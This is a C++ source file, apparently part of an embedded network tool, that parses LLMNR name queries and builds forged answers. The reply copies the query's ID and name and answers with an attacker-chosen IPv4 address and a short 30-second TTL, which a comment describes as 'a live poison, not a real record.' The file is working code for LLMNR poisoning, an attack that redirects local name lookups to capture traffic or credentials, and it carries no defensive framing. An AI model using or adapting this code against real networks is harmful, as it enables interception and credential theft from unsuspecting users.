#include "LlmnrWire.h"
#include "DnsWire.h"

bool llmnrwire::parseQuery(const uint8_t* buf, size_t len, uint16_t& id, String& name, uint16_t& qtype) {
    if (!buf || len < 12) return false;

    uint8_t flagsHi = buf[2];
    bool isResponse = (flagsHi & 0x80) != 0;  // QR bit
    if (isResponse) return false;

    uint16_t qdcount = ((uint16_t)buf[4] << 8) | buf[5];
    if (qdcount != 1) return false;

    int nameEnd = dnswire::skipName(buf, (int)len, 12);
    if (nameEnd < 0 || (size_t)(nameEnd + 4) > len) return false;

    id = ((uint16_t)buf[0] << 8) | buf[1];
    name = dnswire::decodeName(buf, (int)len, 12);
    qtype = ((uint16_t)buf[nameEnd] << 8) | buf[nameEnd + 1];
    return name.length() > 0;
}

std::vector<uint8_t> llmnrwire::buildResponse(const uint8_t* queryBuf, size_t queryLen, const IPAddress& answerIp) {
    std::vector<uint8_t> out;
    if (!queryBuf || queryLen < 12) return out;

    int nameEnd = dnswire::skipName(queryBuf, (int)queryLen, 12);
    if (nameEnd < 0 || (size_t)(nameEnd + 4) > queryLen) return out;
    size_t questionEnd = (size_t)nameEnd + 4;  // + qtype(2) + qclass(2)

    // Header + question section: copied verbatim from the query (same
    // id, same name/qtype/qclass) - only the flags and ANCOUNT change.
    out.assign(queryBuf, queryBuf + questionEnd);
    out[2] = 0x80;  // QR=1 (response), opcode 0, not truncated, no AA
    out[3] = 0x00;
    out[6] = 0x00;  // ANCOUNT = 1
    out[7] = 0x01;

    // Answer RR: NAME is a compression pointer back to the question
    // name at offset 12 (always valid here - single question, name
    // always starts right after the 12-byte header).
    out.push_back(0xC0);
    out.push_back(0x0C);
    out.push_back(0x00);  // TYPE = A
    out.push_back(0x01);
    out.push_back(0x00);  // CLASS = IN
    out.push_back(0x01);
    out.push_back(0x00);  // TTL = 30s - short on purpose, this is a live poison, not a real record
    out.push_back(0x00);
    out.push_back(0x00);
    out.push_back(0x1E);
    out.push_back(0x00);  // RDLENGTH = 4
    out.push_back(0x04);
    out.push_back(answerIp[0]);
    out.push_back(answerIp[1]);
    out.push_back(answerIp[2]);
    out.push_back(answerIp[3]);
    return out;
}
